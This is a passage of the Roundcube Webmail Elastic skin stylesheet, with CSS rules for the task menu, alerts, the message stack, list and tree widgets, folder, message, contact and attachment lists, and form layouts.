     background: #1a1a1a;
   }
   #taskmenu .special-buttons {
     position: absolute;
     bottom: 0;
     left: 0;
     background-color: #000000;
   }
   #taskmenu .action-buttons a {
     color: #cfdee6;
     background: transparent;
   }
   #taskmenu .action-buttons a:hover {
     color: #cfdee6;
     background: #1a1a1a;
   }
   #taskmenu a.logout {
     color: #cfdee6 !important;
   }
 }
 @media screen and (min-width: 481px) and (max-width: 1024px) {
   #taskmenu a {
     width: 42px;
     height: 42px;
     font-size: 1.2rem;
     padding: 0;
   }
   #taskmenu a:before {
     line-height: 42px;
   }
   #taskmenu span.inner {
     display: none;
   }
 }
 @media screen and (min-width: 1025px) {
   #taskmenu a {
     width: 78px;
     font-size: 1rem;
   }
   #taskmenu a:before {
     float: none;
   }
   #taskmenu a:focus {
     background-color: #1a1a1a;
   }
   #taskmenu span.inner {
     padding: 0 0.1em;
   }
 }
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** UI Messages ***/
 .ui.alert {
   margin: 0;
   margin-bottom: 0.2rem;
   opacity: 0.95;
   width: 100%;
   padding: 0.75em;
   color: #2c363a;
   border: 1px solid transparent;
   background-color: rgba(0, 153, 204, 0.05);
   display: flex;
   align-items: center;
 }
 @media screen and (max-width: 480px) {
   .ui.alert {
     border: 0;
   }
 }
 .ui.alert span {
   margin: auto 0;
 }
 .ui.alert > i.icon {
   line-height: 1;
   color: #4d5f66;
   margin: auto 0;
 }
 .ui.alert > i.icon:before {
   content: "\f05a";
   margin-right: 0.6rem;
 }
 .ui.alert .btn {
   margin-left: 0.5rem;
 }
 .ui.alert.loading {
   color: #6b7275;
 }
 .ui.alert.loading > i.icon:before {
   content: "\f1ce";
   -webkit-animation: spinner-border 1.5s infinite linear;
   animation: spinner-border 1.5s infinite linear;
   width: 1em;
 }
 .ui.alert.alert-success > i.icon:before {
   content: "\f058";
   color: #41b849;
 }
 .ui.alert.alert-warning > i.icon:before {
   content: "\f071";
   color: #ffd452;
 }
 .ui.alert.alert-danger > i.icon:before {
   content: "\f06a";
   color: #EC1313;
 }
 .ui.alert.vcardattachment > i.icon:before {
   content: "\f2bb";
 }
 .ui.alert.enigmaattachment > i.icon:before {
   content: "\f084";
 }
 .ui.alert.signed > i.icon:before,
 .ui.alert.encrypted > i.icon:before {
   content: "\f023";
 }
 .ui.alert.chat > i.icon:before {
   content: "\f075";
 }
 .ui.alert .boxbuttons {
   white-space: nowrap;
 }
 .ui.alert .boxbuttons .btn {
   overflow: hidden;
   text-overflow: ellipsis;
   max-width: 220px;
 }
 @media screen and (max-width: 480px) {
   .ui.alert .boxbuttons {
     display: flex;
     flex-direction: column;
   }
   .ui.alert .boxbuttons .btn {
     max-width: 160px;
   }
   .ui.alert .boxbuttons .btn:not(:first-child) {
     margin-top: 0.25rem;
   }
 }
 .ui.alert.aligned-buttons {
   display: flex;
 }
 .ui.alert.aligned-buttons span {
   flex: 1;
 }
 .ui.alert a:not(.btn) {
   color: #0099cc;
   font-weight: normal;
 }
 .ui.alert h3 {
   font-weight: bold;
   font-size: 1.2rem;
 }
 .ui.alert p {
   margin: 1rem 0;
 }
 .ui.alert.boxerror,
 .ui.alert.boxconfirmation,
 .ui.alert.boxinformation,
 .ui.alert.boxwarning {
   padding: 0.5em;
   border-radius: 0;
 }
 .ui.alert.boxerror i.icon,
 .ui.alert.boxconfirmation i.icon,
 .ui.alert.boxinformation i.icon,
 .ui.alert.boxwarning i.icon {
   font-size: 1.5em !important;
 }
 .ui.alert.boxerror {
   background-color: rgba(236, 19, 19, 0.15);
 }
 .ui.alert.boxinformation {
   background-color: rgba(0, 153, 204, 0.15);
 }
 .ui.alert.boxconfirmation {
   background-color: rgba(65, 184, 73, 0.15);
 }
 .ui.alert.boxwarning {
   background-color: rgba(255, 255, 102, 0.25);
 }
 .ui.alert + table {
   margin-top: 1em;
 }
 #messagestack {
   position: absolute;
   bottom: 0.5em;
   right: 0.7em;
   z-index: 105;
   width: 320px;
   height: auto;
   max-height: 85%;
 }
 @media screen and (max-width: 480px) {
   #messagestack {
     left: 0;
     right: 0;
     bottom: 0;
     width: auto;
   }
 }
 #messagestack div {
   background-color: #2c363a;
   color: #fff;
 }
 @media screen and (max-width: 480px) {
   #messagestack div {
     margin: 0;
     border-radius: 0;
     min-height: 4.2rem;
   }
 }
 #messagestack div.voice {
   position: absolute;
   top: -1000px;
 }
 #messagestack div i.icon {
   font-size: 1.5em !important;
 }
 #messagestack div > i.icon:before {
   color: #fff;
 }
 #messagestack div:last-child {
   margin-bottom: 0;
 }
 #messagestack .loading {
   background-color: #6b7275;
 }
 #messagestack .alert-info.information {
   background-color: #0099cc;
 }
 #messagestack .alert-success {
   background-color: #41b849;
 }
 #messagestack .alert-warning {
   background-color: #ffd452;
 }
 #messagestack .alert-danger {
   background-color: #EC1313;
 }
 #messagestack a {
   color: inherit !important;
   text-decoration: underline;
   cursor: pointer;
 }
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** List and treelist widgets ***/
 .listing tbody td,
 .listing li {
   border-bottom: 1px solid #f1f3f4;
   cursor: default;
   font-weight: normal;
   line-height: 35px;
 }
 .listing tbody td,
 .listing li a {
   padding: 0 0.5rem;
   white-space: nowrap;
   vertical-align: middle;
   color: #2c363a;
 }
 .listing tbody td {
   overflow: hidden;
   text-overflow: ellipsis;
   outline: none;
 }
 .listing tbody td a {
   color: #2c363a;
 }
 .listing li a {
   display: block;
   text-decoration: none;
   cursor: default;
   width: 100%;
 }
 .listing li.selected,
 .listing tr.selected td {
   color: #2c363a;
   background-color: #0099cc;
 }
 .listing td.selection {
   padding: 0 0 0 0.5em;
   width: 2em;
   text-align: center;
 }
 .listing td.selection > input {
   vertical-align: middle;
 }
 .listing:not(.withselection) td.selection {
   display: none;
 }
 .listing td.name {
   overflow: hidden;
   text-overflow: ellipsis;
 }
 .listing td.action {
   padding: 0 0.5em;
   width: 2em;
   text-align: center;
 }
 .listing td.action:empty {
   width: 0;
 }
 .listing td.action a {
   display: block;
   overflow: hidden;
   text-decoration: none;
 }
 .listing td.action a:before {
   margin: 0;
   font-size: 1rem;
 }
 .listing td.action a.pushgroup:before {
   content: "\f054";
 }
 .listing li.droptarget > a,
 .listing tr.droptarget > td {
   background-color: #ffffcc;
 }
 .listing li.disabled,
 .listing tr.disabled td {
   color: rgba(44, 54, 58, 0.5);
 }
 .listing li > a.virtual,
 .listing li.virtual > a {
   opacity: 0.4;
 }
 .listing span.secondary {
   color: #737677;
 }
 html:not(.touch) .listing li > a,
 html:not(.touch) .listing tbody tr > td:first-child,
 html:not(.touch) .listing:not(.withselection) tbody tr > td.selection + td {
   border-left: 2px solid transparent;
 }
 html:not(.touch) .listing li > a:focus,
 html:not(.touch) .listing.focus tbody tr.focused > td:first-child,
 html:not(.touch) .listing.focus:not(.withselection) tbody tr.focused > td.selection + td {
   border-left: 2px solid #33ccff;
   outline: 0;
 }
 table.listing {
   width: 100%;
   table-layout: fixed;
   border-spacing: 0;
   border-collapse: unset;
 }
 ul.listing {
   margin: 0;
   padding: 0;
 }
 ul.listing > ul {
   padding: 0;
 }
 ul.listing li {
   overflow: hidden;
   text-overflow: ellipsis;
   white-space: nowrap;
   position: relative;
   list-style: none;
 }
 ul.listing li ul {
   border-top: 1px solid #f1f3f4;
   padding-left: 1.5em;
 }
 ul.listing li ul li:last-child {
   border-bottom: none;
 }
 ul.listing li .custom-switch {
   position: absolute;
   padding: 0;
   top: 0;
   right: 0;
   height: 35px;
   vertical-align: middle;
 }
 ul.listing li .custom-switch .custom-control-label:before,
 ul.listing li .custom-switch .custom-control-label:after {
   margin-top: 0.4rem;
 }
 html.touch ul.listing li .custom-switch .custom-control-label:before,
 html.touch ul.listing li .custom-switch .custom-control-label:after {
   margin-top: 0.75rem;
 }
 ul.listing.simplelist li {
   padding: 0 0.5rem;
 }
 .listing-info {
   position: absolute;
   top: 50%;
   left: 50%;
   transform: translate(-50%, -50%);
   width: 80%;
   text-align: center;
   font-weight: bold;
   color: #737677;
 }
 html.touch .listing:not(.toolbar) li,
 html.touch .listing tbody td {
   line-height: 47px;
   font-size: 1.2rem;
 }
 html.touch li input[type=checkbox] {
   height: 47px;
 }
 html.touch td.selection {
   padding: 0;
   width: 3em;
 }
 @media screen and (max-width: 1200px) {
   .listing.selection-large-only li.selected {
     color: #2c363a;
     background-color: transparent;
   }
 }
 /* icons */
 .listing.iconized li a:before {
   height: 2em;
   margin-right: 0.5rem;
 }
 .listing.iconized li.preferences > a:before {
   content: "\f1de";
 }
 .listing.iconized li.folders > a:before {
   content: "\f07b";
 }
 .listing.iconized li.responses > a:before {
   content: "\f075";
 }
 .listing.iconized li.identities > a:before {
   content: "\f2c2";
 }
 .listing.iconized li.password > a:before {
   content: "\f023";
 }
 .listing.iconized li.addressbook a:before {
   content: "\f2b9";
   font-weight: 400;
 }
 .listing.iconized li.contactgroup a:before {
   content: "\f0c0";
   font-weight: 900;
 }
 .listing.iconized li.contactsearch a:before {
   content: "\f002";
 }
 .listing.iconized li.filter > a:before {
   content: "\f0b0";
 }
 .listing.iconized li.vacation > a:before {
   content: "\f017";
   font-weight: 400;
 }
 .listing.iconized li.forward > a:before {
   content: "\f14d";
 }
 .listing.iconized li.enigma.keys > a:before {
   content: "\f084";
 }
 .listing.iconized li.userinfo > a:before {
   content: "\f05a";
 }
 .listing.iconized li.twofactorauth > a:before {
   content: "\f2f6";
 }
 .listing.iconized li a.help:before {
   content: "\f1cd";
 }
 .listing.iconized li a.about:before {
   content: "\f059";
   font-weight: 400;
 }
 .listing.iconized li a.license:before {
   content: "\f3ed";
 }
 .listing.iconized li > i:before {
   content: "\f007";
   margin-left: 0.5rem;
 }
 .listing.iconized li.group > i:before {
   content: "\f0c0";
 }
 html.ie11 .listing.iconized li a:before {
   font-size: 1.25rem;
 }
 .listing.iconized tr td:before {
   margin-right: 0.5rem;
 }
 .listing.iconized tr.contact.person td.name:before {
   content: "\f007";
 }
 .listing.iconized tr.contact.group td.name:before {
   content: "\f0c0";
 }
 .listing.iconized tr.general > td.section:before {
   content: "\f108";
 }
 .listing.iconized tr.mailbox > td.section:before {
   content: "\f0e0";
   font-weight: 400;
 }
 .listing.iconized tr.mailview > td.section:before {
   content: "\f01c";
 }
 .listing.iconized tr.compose > td.section:before {
   content: "\f1d8";
 }
 .listing.iconized tr.addressbook > td.section:before {
   content: "\f0c0";
 }
 .listing.iconized tr.folders > td.section:before {
   content: "\f07b";
   font-weight: 400;
 }
 .listing.iconized tr.server > td.section:before {
   content: "\f233";
 }
 .listing.iconized tr.enigma > td.section:before {
   content: "\f023";
 }
 .listing.iconized tr.calendar > td.section:before {
   content: "\f133";
 }
 .listing.iconized tr.chat > td.section:before {
   content: "\f086";
 }
 /* selecatable list: e.g. spellcheck language selection */
 .listing.iconized.selectable li a:before {
   content: "";
 }
 .listing.iconized.selectable li a.selected:before {
   content: "\f00c";
 }
 .popupmenu .listing li > a {
   border-left: 0;
 }
 .popupmenu .listing li > a:not(.disabled):hover {
   color: #fff;
   background-color: #0099cc;
 }
 .popupmenu .listing li.selected {
   color: #fff;
   background-color: #0099cc;
 }
 .popupmenu .listing td {
   overflow: hidden;
   text-overflow: ellipsis;
 }
 ul.treelist li div.treetoggle {
   position: absolute;
   top: 0;
   left: 0;
   width: 1.5em;
   cursor: pointer;
   background-color: transparent;
 }
 ul.treelist li div.treetoggle:before {
   content: "\f105";
   margin-left: 0.25em;
   font-size: 1em;
 }
 ul.treelist li div.treetoggle.expanded:before {
   content: "\f107";
 }
 ul.treelist li > a {
   overflow: hidden;
   text-overflow: ellipsis;
   padding-left: 1.5em;
 }
 ul.treelist li.selected {
   color: inherit;
   background-color: transparent;
 }
 ul.treelist li.selected > div > a,
 ul.treelist li.selected > a {
   color: #2c363a;
   background-color: #0099cc;
 }
 ul.treelist li ul {
   padding: 0;
 }
 ul.treelist li ul li {
   padding-left: 0;
 }
 ul.treelist li ul li a {
   padding-left: 3em;
 }
 ul.treelist li ul li div.treetoggle {
   left: 1.5em;
 }
 ul.treelist li ul li li a {
   padding-left: 4.5em;
 }
 ul.treelist li ul li li div.treetoggle {
   left: 3em;
 }
 ul.treelist li ul li li li a {
   padding-left: 6em;
 }
 ul.treelist li ul li li li div.treetoggle {
   left: 4.5em;
 }
 ul.treelist li ul li li li li a {
   padding-left: 7.5em;
 }
 ul.treelist li ul li li li li div.treetoggle {
   left: 6em;
 }
 ul.treelist li ul li li li li li a {
   padding-left: 9em;
 }
 ul.treelist li ul li li li li li div.treetoggle {
   left: 7.5em;
 }
 ul.treelist.notree div.treetoggle {
   display: none;
 }
 ul.treelist.notree li > a {
   padding-left: 0.5em;
 }
 /*** Folders list widget ***/
 .folderlist li.mailbox.unread > a {
   padding-right: 2.8em;
   font-weight: bold;
 }
 .folderlist li.mailbox.recent {
   color: blue;
 }
 .folderlist li.mailbox .unreadcount {
   position: absolute;
   top: 0;
   right: 0;
   min-width: 2em;
   line-height: 1.4rem;
   margin: 7.7px;
   padding: 0 0.3em;
   border-radius: 0.4em;
   background: #0099cc;
   color: #fff;
   text-align: center;
   font-weight: bold;
 }
 html.touch .folderlist li.mailbox .unreadcount {
   line-height: 2rem;
   margin: 9.5px;
 }
 .folderlist li.mailbox.recent > .unreadcount {
   background: blue;
   color: #fff;
 }
 .folderlist li.mailbox.root {
   display: none !important;
 }
 .folderlist li a:before {
   content: "\f07b";
   font-weight: 400;
   margin-right: 0.5rem;
 }
 .folderlist li.inbox > a:before {
   content: "\f01c";
   font-weight: 900;
 }
 .folderlist li.trash a:before {
   content: "\f2ed";
   font-weight: 900;
 }
 .folderlist li.trash.empty > a:before {
   content: "\f2ed";
   font-weight: 400;
 }
 .folderlist li.drafts a:before {
   content: "\f303";
   font-weight: 900;
 }
 .folderlist li.sent a:before {
   content: "\f1d8";
   font-weight: 900;
 }
 .folderlist li.junk a:before {
   content: "\f7e4";
   font-weight: 900;
 }
 .folderlist li.archive > a:before {
   content: "\f187";
   font-weight: 900;
 }
 .folderlist.menu a:before {
   margin-left: 0.5em;
 }
 /*** Messages list widget ***/
 .messagelist > thead,
 .messagelist .branch,
 table.fixedcopy {
   display: none;
 }
 .messagelist td {
   border-left: 0;
   width: 2em;
   vertical-align: top;
   font-size: 1rem !important;
 }
 .messagelist td.subject {
   width: 100%;
   padding-right: 0;
   display: flex;
   flex-wrap: wrap;
 }
 .messagelist td.subject a {
   text-decoration: none;
   cursor: default;
 }
 .messagelist td.subject span {
   line-height: 2em;
 }
 .messagelist td.subject span.date {
   font-size: 90%;
   color: #737677;
 }
 .messagelist td.subject span.fromto {
   overflow: hidden;
   text-overflow: ellipsis;
   flex: 1;
   font-size: 90%;
   color: #737677;
   padding-left: 1.5em;
   padding-right: 0.5rem;
 }
 .messagelist td.subject span.subject {
   overflow: hidden;
   text-overflow: ellipsis;
   width: 100%;
 }
 .messagelist td.threads {
   padding: 0 0 0 0.25rem;
   width: 1.5em;
 }
 .messagelist td.flags {
   width: 2.5em;
 }
 .messagelist td.flags > span {
   height: 1.7em;
   line-height: 1.7em;
   display: block;
 }
 .messagelist td.flags > span.flag {
   cursor: pointer;
 }
 .messagelist tr.flagged td,
 .messagelist tr.flagged td.subject span.subject a,
 .messagelist tr.flagged td.subject span.date,
 .messagelist tr.flagged td.subject span.fromto {
   color: #EC1313;
 }
 .messagelist tr.deleted td,
 .messagelist tr.deleted td.subject span.subject a,
 .messagelist tr.deleted td.subject span.date,
 .messagelist tr.deleted td.subject span.fromto {
   color: rgba(44, 54, 58, 0.5);
 }
 .messagelist tr.unread td.subject span.subject {
   font-weight: bold;
 }
 .messagelist tr.unroot td.subject a {
   text-decoration: underline;
 }
 .messagelist tr.thread td.threads div:before {
   content: "\f105";
   cursor: pointer;
   width: 1em;
 }
 .messagelist tr.thread.expanded td.threads div:before {
   content: "\f107";
 }
 .messagelist td.subject span.msgicon.status:before {
   content: "\f111";
   cursor: pointer;
   font-size: 0.4rem;
   width: 1.1rem;
   height: 2rem;
 }
 .messagelist td.subject span.msgicon.status.unread:before {
   content: "\f111";
   color: #ffd452;
   font-size: 0.5rem;
 }
 .messagelist td.subject span.msgicon.status.unreadchildren:before {
   content: "\f111";
   font-weight: 400;
   font-size: 0.5rem;
 }
 .messagelist td.subject span.msgicon.status.replied:before {
   content: "\f3e5";
   font-weight: 900;
   font-size: 1rem;
 }
 .messagelist td.subject span.msgicon.status.forwarded:before {
   content: "\f064";
   font-weight: 900;
   font-size: 1rem;
 }
 .messagelist td.subject span.msgicon.status.replied.forwarded:before {
   content: "\f3e5";
   font-weight: 900;
   font-size: 1rem;
 }
 tr.deleted .messagelist td.subject span.msgicon.status:before {
   content: "\f05e";
   font-weight: 900;
   font-size: 1rem;
 }
 .messagelist span.attachment span {
   color: rgba(115, 118, 119, 0.75);
 }
 .messagelist span.attachment span:before {
   margin: 0;
   content: "\f0c6";
 }
 .messagelist span.attachment span.report:before {
   content: "\f15c";
   font-weight: 400;
 }
 .messagelist span.attachment span.encrypted:before {
   content: "\f023";
 }
 .messagelist span.attachment span.vcard:before {
   content: "\f007";
   font-weight: 400;
 }
 .messagelist span.flagged:before {
   content: "\f024";
 }
 .messagelist tr:hover span.unflagged:before {
   content: "\f024";
   font-weight: 400;
 }
 html.layout-phone .messagelist tr,
 html.touch .messagelist tr {
   position: relative;
 }
 html.layout-phone .messagelist td.flags,
 html.touch .messagelist td.flags {
   top: 0.25rem;
   right: 0;
   bottom: 0;
 }
 html.layout-phone .messagelist td.flags .flag,
 html.touch .messagelist td.flags .flag {
   visibility: hidden;
 }
 html.layout-phone .messagelist td.subject,
 html.touch .messagelist td.subject {
   padding-right: 0.5em;
 }
 html.layout-phone .messagelist td.subject .subject,
 html.touch .messagelist td.subject .subject {
   padding-right: 1.5rem;
 }
 /* Contacts list */
 .contactlist .contact.readonly td {
   font-style: italic;
 }
 .contactlist td.contact:before {
   content: "\f007";
 }
 .contactlist td.contactgroup:before {
   content: "\f0c0";
 }
 .contactlist span.email {
   display: inline;
   color: #737677;
   font-style: italic;
   margin-left: 0.5em;
 }
 .contactlist li a:before {
   margin-right: 0.5rem;
 }
 .contactlist li a.addressbook::before {
   content: "\f2b9";
   font-weight: 400;
 }
 .contactlist li a.contactgroup::before {
   content: "\f0c0";
   font-weight: 900;
 }
 /* Attachments list */
 .attachmentslist {
   padding: 0;
   margin: 0;
   background-color: #fcfcfc;
   border: 1px solid #f4f4f4;
 }
 .attachmentslist:empty {
   padding: 0;
   border: 0;
 }
 .attachmentslist li {
   list-style: none;
   display: inline-flex;
   white-space: nowrap;
   line-height: 2rem;
   padding: 0 0.25em;
   max-width: 100%;
 }
 .attachmentslist li:before {
   content: "\f15b";
   font-weight: 400;
   height: 2rem;
   margin: 0;
 }
 .attachmentslist li.txt:before,
 .attachmentslist li.text:before {
   content: "\f15c";
   font-weight: 400;
 }
 .attachmentslist li.pdf:before {
   content: "\f1c1";
   font-weight: 400;
 }
 .attachmentslist li.odt:before,
 .attachmentslist li.doc:before,
 .attachmentslist li.docx:before,
 .attachmentslist li.msword:before {
   content: "\f1c2";
   font-weight: 400;
 }
 .attachmentslist li.ods:before,
 .attachmentslist li.xls:before,
 .attachmentslist li.xlsx:before,
 .attachmentslist li.msexcel:before {
   content: "\f1c3";
   font-weight: 400;
 }
 .attachmentslist li.rar:before,
 .attachmentslist li.zip:before,
 .attachmentslist li.gz:before {
   content: "\f1c6";
   font-weight: 400;
 }
 .attachmentslist li.image:before,
 .attachmentslist li.jpg:before,
 .attachmentslist li.jpeg:before,
 .attachmentslist li.png:before {
   content: "\f1c5";
   font-weight: 400;
 }
 .attachmentslist li.mp3:before,
 .attachmentslist li.audio:before {
   content: "\f1c7";
   font-weight: 400;
 }
 .attachmentslist li.m4p:before,
 .attachmentslist li.video:before {
   content: "\f1c8";
   font-weight: 400;
 }
 .attachmentslist li.vcard:before {
   content: "\f2bb";
   font-weight: 400;
 }
 .attachmentslist li.html:before {
   content: "\f1c9";
   font-weight: 400;
 }
 .attachmentslist li.odp:before,
 .attachmentslist li.otp:before,
 .attachmentslist li.ppt:before,
 .attachmentslist li.pptx:before,
 .attachmentslist li.ppsx:before,
 .attachmentslist li.vnd.mspowerpoint:before {
   content: "\f1c4";
   font-weight: 400;
 }
 .attachmentslist li a {
   text-decoration: none;
   line-height: 2rem;
   height: 2rem;
 }
 .attachmentslist li a.cancelupload:before,
 .attachmentslist li a.delete:before {
   content: "\f2ed";
   line-height: 2rem;
   height: 2rem;
   margin: 0;
 }
 .attachmentslist li a.dropdown:before {
   margin: 0;
 }
 .attachmentslist li.uploading:before {
   -webkit-animation: spinner-border 1.5s infinite linear;
   animation: spinner-border 1.5s infinite linear;
   content: "\f1ce";
   font-weight: 900;
 }
 .attachmentslist li a.filename {
   display: flex;
   overflow: hidden;
   padding: 0 0.2em;
 }
 .attachmentslist li .attachment-name {
   overflow: hidden;
   text-overflow: ellipsis;
   color: #2c363a;
 }
 .attachmentslist li .attachment-size {
   color: #737677;
   padding-left: 0.25em;
 }
 .keylist {
   padding: 0;
   list-style: none;
 }
 .keylist li {
   line-height: 2;
 }
 .keylist li:before {
   content: "\f084";
   line-height: 1.5;
 }
 #identities-table td.mail:before {
   content: "\f2c2";
 }
 #responses-table td.name:before {
   content: "\f075";
 }
 #filterslist td.name:before {
   content: "\f0b0";
 }
 #filtersetslist td.name:before {
   content: "\f15c";
 }
 #subscription-table li.mailbox a {
   padding-right: 2.5rem;
 }
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** Common form elements ***/
 #uploadform {
   display: none;
 }
 form.smart-upload,
 input.smart-upload {
   visibility: hidden;
   width: 1px;
   height: 1px;
   opacity: 0;
 }
 .propform:not(.popupmenu) {
   width: 100%;
 }
 .propform .form-check td:not(.title) > label {
   display: block;
   margin: 0;
   line-height: 2rem;
 }
 .propform .form-check td:not(.title) > label label {
   margin-right: 0.5rem;
 }
 .propform td.datetime {
   display: flex;
 }
 .propform td.datetime input:first-child {
   margin-right: 0.5rem;
 }
 .propform td.datetime input:last-child {
   width: 75%;
 }
 .propform td.rowbuttons {
   width: 1%;
   white-space: nowrap;
   vertical-align: top;
 }
 .propform td.rowbuttons span {
   display: none;
 }
 .propform td.rowbuttons a {
   padding: 0;
   line-height: 2.3rem;
   height: 2.3rem;
   font-size: 1rem;
 }
 .propform td.rowbuttons a:before {
   content: "\f067";
   vertical-align: unset;
 }
 @media screen and (min-width: 577px) {
   .propform td.rowbuttons a:before {
     margin: 0 !important;
   }
 }
 .propform td.rowbuttons a.delete:before {
   content: "\f2ed";
 }
 .propform td.rowbuttons a.advanced:before {
   content: "\f013";
 }
 .propform td.rowbuttons a:not(:last-child) {
   margin-right: 0.25rem;
 }
 .propform td.rowactions {
   width: 1%;
   vertical-align: top;
 }
 .propform td.rowactions .form-control {
   width: auto;
 }
 .propform td.rowtargets {
   vertical-align: top;
 }
 .propform td.rowtargets .composite input,
 .propform td.rowtargets .composite textarea,
 .propform td.rowtargets .composite select,
 .propform td.rowtargets .composite .multi-input,
 .propform td.rowtargets .composite .input-group {
   margin-bottom: 0.5rem;
 }
 .propform td.rowtargets .composite .input-group input,
 .propform td.rowtargets .composite .input-group textarea,
 .propform td.rowtargets .composite .input-group select,
 .propform td.rowtargets .composite .input-group .multi-input {
   margin-bottom: 0;
 }
 .propform td.rowtargets .composite br {
   display: block;
 }
 .propform td.rowtargets .input-group {
   margin-bottom: 0.25rem;
 }
 .propform td.rowtargets .input-group *:first-child.input-group-prepend {
   text-align: left;
   min-width: 7.5em;
 }
 .propform td.rowtargets .input-group *:first-child.input-group-prepend > * {
   width: 100%;
 }
 .propform td.rowtargets > .advanced {
   margin-top: 0.25rem;
 }
 .propform td.title {
   padding-top: 0;
   padding-bottom: 0;
 }
 .propform td > .flexbox {
   display: flex;
 }
 .propform td > .flexbox > .multi-input {
   width: 100%;
   margin-left: 0.25rem;
 }
 .propform.groupped.readonly legend {
   margin: 0;
 }
 .propform.groupped.readonly .row.input-group {
   margin-bottom: 0 !important;
 }
 .propform.groupped.readonly label {
   min-width: 7rem;
   background-color: transparent;
   border: 0;
   border-radius: 0;
 }
 .propform.groupped .row.input-group {
   margin-bottom: 0.5rem;
   flex-wrap: nowrap;
 }
 .propform.groupped .row.input-group > *:first-child {
   overflow: hidden;
   text-overflow: ellipsis;
   min-width: 8rem;
 }
 .propform.groupped .row.input-group > *:first-child:not(select) {
   padding: 0;
 }
 @media screen and (max-width: 480px) {
   .propform.groupped .row.input-group > *:first-child {
     min-width: 6rem;
     width: 6rem;
     flex-grow: unset;
   }
 }
 .propform.groupped .row.input-group > *:first-child label {
   width: 100%;
 }
 .propform.groupped .row.input-group > *:nth-child(2) {
   flex-grow: 30;
 }
 .propform.groupped .row.input-group:last-child {
   margin-bottom: 1rem;
 }
 .propform.groupped .row.input-group select {
   text-align: left;
 }
 .propform.groupped .row.input-group.composite select {
   height: auto;
 }
 .propform.groupped .row.input-group .content {
   padding: 0;
   display: flex;
   flex-wrap: wrap;
   border-radius: 0;
 }
 .propform.groupped .row.input-group .content input {
   border-radius: 0;
   border-color: transparent;
 }
 .propform.groupped .row.input-group .content .ff_street {
   width: 100%;
 }
 .propform.groupped .row.input-group .content .ff_locality {
   width: 75%;
 }
 .propform.groupped .row.input-group .content .ff_zipcode {
   width: 25%;
 }
 .propform.groupped .row.input-group .content .ff_country,
 .propform.groupped .row.input-group .content .ff_region {
   width: 50%;
 }
 .propform.groupped .form-control-plaintext {
   flex-grow: 1;
   border: 0;
 }
 .propform .addfield {
   margin: 0;
 }
 .propform .addfield select {
   width: 8rem;
   margin-top: 0.5rem;
 }
 .propform .form-text {
   font-size: 90%;
   color: #737677;
 }
 .propform.row.form-group {
   margin-left: 0;
   margin-right: 0;
 }
 .propform.row.form-group label,
 .propform.row.form-group div {
   padding-left: 0;
   padding-right: 0;
 }
 .propform select + select,
 .propform select + .input-group {
   padding-top: 0.5rem;
 }
 .propform.text-only {
   margin-bottom: 0.25rem;
 }
 .propform.text-only tr {
   margin: 0;
 }
 .propform.text-only label {
   padding-bottom: 0 !important;
 }
 @media screen and (max-width: 576px) {
   .propform.text-only tr {
     display: table-row;
   }
   .propform.text-only td {
     width: auto;
   }
   .propform.text-only td:first-child {
     width: 33%;
   }
   .propform.text-only :not(tr).form-group.row .col-form-label {
     width: 33%;
   }
   .propform.text-only :not(tr).form-group.row > :last-child {
     width: 67%;
   }
 }
 @media screen and (max-width: 576px) {
   .propform table.compact-table .rowactions > select,
   .propform table.compact-table .flexbox > select {
     width: 100%;
   }
   .propform table.compact-table tr {
     display: flex;
     flex-direction: column;
   }
   .propform table.compact-table tr td {
     width: 100%;
     padding: 0.25rem 0 0 0;
   }
   .propform table.compact-table tr td.rowbuttons {
     text-align: right;
     padding-top: 0;
   }
   .propform table.compact-table tr td.rowbuttons a {
     margin-left: 0.5rem;
   }
   .propform table.compact-table tr td.rowbuttons a > span {
     display: inline;
   }
 }
 .propform fieldset:not(.tab-pane):nth-of-type(n+2),
 .formcontent fieldset:not(.tab-pane):nth-of-type(n+2) {
   margin-top: 1em;
 }
 .propform legend,
 .formcontent legend {
   font-weight: bold;
   font-size: 1.2em;
 }
 .propform label,
 .formcontent label {
   -webkit-hyphens: auto;
   -ms-hyphens: auto;
   hyphens: auto;
   overflow: hidden;
   margin-bottom: 0;
 }
 fieldset.advanced > legend {
   width: auto;
   cursor: pointer;
 }
 fieldset.advanced > legend:after {
   float: right;
   margin: 0 0 0 0.25rem;
   line-height: inherit;
   font-size: inherit;
   content: "\f106";
 }
 fieldset.advanced > legend.closed:after {
   content: "\f107";
 }
 @media screen and (max-width: 576px) {
   .formcontent .text-only .form-group:not(tr) {
     margin-bottom: 0.25rem;
   }
   .formcontent .text-only .form-group:not(tr) .col-form-label {
     width: 33%;
   }
   .formcontent .text-only .form-group:not(tr) .col-form-label + span {
     width: 67%;
   }
   html.iframe .formcontent > .propform {
     padding: 0.25rem;
   }
 }
 html.ms .propform .row:not(.form-check) > td {
   display: flex;
   flex-wrap: wrap;
 }
 @media screen and (min-width: 576px) {
   html.ms .propform .row.form-check > td {
     display: flex;
   }
 }
 .formcontainer {
   display: flex;
   flex-direction: column;
   justify-content: flex-start;
   overflow-y: hidden !important;
 }
 .formcontainer .formcontent {
   overflow-x: hidden;
   overflow-y: auto;
 }
 .formcontainer .formbuttons {
   padding: 0.5rem 1rem;
 }
 .formcontainer .formbuttons button {
   margin-right: 0.5rem;
 }
 html.iframe.ipad .formcontainer .formbuttons,
 html.iframe.webkit.tablet .formcontainer .formbuttons {
   min-height: 4rem;
 }
 html.layout-small .formcontainer,
 html.layout-phone .formcontainer {
   display: initial;
   overflow-y: auto !important;
 }
 html.layout-small .formcontainer .formcontent,
 html.layout-phone .formcontainer .formcontent {
   overflow: initial !important;
 }
 html.layout-small .formcontainer .formbuttons,
 html.layout-phone .formcontainer .formbuttons {
   display: none;
 }
